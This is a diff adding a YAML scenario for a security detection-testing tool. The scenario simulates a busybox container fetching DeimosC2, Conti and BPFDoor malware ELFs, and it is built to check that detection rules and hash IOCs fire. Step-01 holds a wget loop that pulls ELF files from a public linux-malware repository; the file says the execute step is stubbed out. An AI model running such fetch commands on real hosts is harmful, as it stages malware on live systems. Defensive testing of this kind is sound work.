@@ -1,0 +1,141 @@
+scenario_id: SIM-CDR-013
+name: "Insecure Deployment Runtime Detonation — Busybox Pod Fetches Malware ELFs"
+version: "1.0"
+status: active
+
+plane: CDR
+detection_types:
+  - BIOC
+  - XQL
+  - IOC
+  - Correlation
+
+uc_ref: UCS-CDR-13
+tc_ref: TC-CDR-13
+uc_name: "Insecure Deployment Runtime Detonation Detection"
+tc_name: "Busybox ELF Retrieval + Malware Hash IOC Match"
+
+mitre_tactic: "TA0005"
+mitre_tactic_name: "Defense Evasion"
+mitre_technique: "T1610"
+mitre_technique_name: "Deploy Container"
+additional_techniques:
+  - technique: "T1496"
+    name: "Resource Hijacking"
+
+threat_report: "Unit42 - Cloud Threat Report: The State of Cloud-Native Security"
+threat_report_url: "https://unit42.paloaltonetworks.com/cloud-threat-report-volume-7/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+# Posture-to-runtime: an insecure multi-container busybox deployment wgets real
+# malware ELFs (DeimosC2/Conti/BPFDoor) from a public repo and detonates them.
+# CortexSim NEUTERS the real fetch+exec into an egress+file-write shape
+# (chmod/exec stubbed) and tracks the three ELF SHA-256 hashes + repo host as
+# IOCs for feed coverage without detonation. Maps to the Signal Injection &
+# Detection Accuracy family (F1).
+validation_methodology: "Insecure Deployment Detonation Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 300
+  unit: "seconds"
+success_criteria: |
+  The in-container malware ELF retrieval (busybox wget of an ELF from a public
+  code repository, staged executable) is detected in xdr_data and the egress
+  to the linux-malware repo surfaces in network_story, and the staged ELF
+  hashes match the DeimosC2/Conti/BPFDoor IOC feed, with the correlation rule
+  stitching the retrieval and the IOC hash match into one posture-to-runtime
+  detonation incident within the MTTD budget — proving Cortex Cloud CDR +
+  XSIAM cover the insecure-deployment detonation chain without executing real
+  malware.
+moat_tier: "LEAD"
+
+steps:
+  - id: step-01
+    name: "Insecure busybox deployment fetches malware ELFs (neutered, no execute)"
+    command: |
+      WORK="$(mktemp -d /tmp/cortexsim-elfsim.XXXXXX)"
+      for name in deimosC2 conti bpfdoor; do
+        wget -q "https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/placeholder/${name}.elf" -O "$WORK/${name}.elf" 2>/dev/null || \
+          echo "[CortexSim] simulated fetch of ${name}.elf — chmod/exec stubbed [truncated]"
+      done
+      echo "[*] insecure-deployment ELF-retrieval shape produced in $WORK — binaries NOT executed"
+    identity: container-runtime
+    mitre_technique: "T1610"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "A minimal/busybox container wget-s an ELF from a public code repository and stages it executable — the insecure-deployment runtime-detonation shape"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: bioc-cdr-013-busybox-container-fetches-and-executes-elf
+      - plane: CDR
+        type: XQL
+        description: "busybox container egress to raw.githubusercontent.com/timb-machine/linux-malware retrieving the ELFs — the IOC-match egress shape"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: xql-cdr-013-malware-elf-retrieval-from-public-repository
+
+  - id: step-02
+    name: "Match staged ELF hashes against the malware IOC feed"
+    command: |
+      echo "[*] DeimosC2/Conti/BPFDoor file-hash IOCs matched against the staged ELFs (no execution)"
+    identity: container-runtime
+    mitre_technique: "T1496"
+    expected_detections:
+      - plane: CDR
+        type: IOC
+        description: "Unix.Backdoor.DeimosC2 ELF SHA-256 matched against the staged binary"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: ioc-file-sha256-05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d
+      - plane: CDR
+        type: IOC
+        description: "Conti ransomware ELF SHA-256 matched against the staged binary"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: ioc-file-sha256-bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e
+      - plane: CDR
+        type: IOC
+        description: "BPFDoor backdoor ELF SHA-256 matched against the staged binary"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: ioc-file-sha256-07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d
+
+  - id: step-03
+    name: "Stitch ELF retrieval + IOC hash match into one detonation incident"
+    command: |
+      echo "[*] Cortex correlation CR-CDR-0013 fuses the insecure-deployment ELF retrieval and the egress to the public malware repo into one posture-to-runtime detonation incident"
+    identity: container-runtime
+    mitre_technique: "T1610"
+    expected_detections:
+      - plane: ANALYTICS
+        type: Correlation
+        description: "Correlation CR-CDR-0013 stitches the ELF-fetch BIOC and the malware-repo egress XQL into a single detonation incident, enriched by the file-hash IOC matches"
+        ttp_ref: "TTP-2026-0085"
+        detection_id: CR-CDR-0013
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortexsim-elfsim.*"
+    - "echo '[CortexSim] SIM-CDR-013 cleanup complete'"
+
+author: "Henry Reed"
+created: "2026-06-17"
+last_updated: "2026-06-17"
+tags:
+  - container-security
+  - kubernetes
+  - insecure-deployment
+  - malware-staging
+  - c2
+  - cloud-native
+infra_modules_needed:
+  - cdr
+  - base
